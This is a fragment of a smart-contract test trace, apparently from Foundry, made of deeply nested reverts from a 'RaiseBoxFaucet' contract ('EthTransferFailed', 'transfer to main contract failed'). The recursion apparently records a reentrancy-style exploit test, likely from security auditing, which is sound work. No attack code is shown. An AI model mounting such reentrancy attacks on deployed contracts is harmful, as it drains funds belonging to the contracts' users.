    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
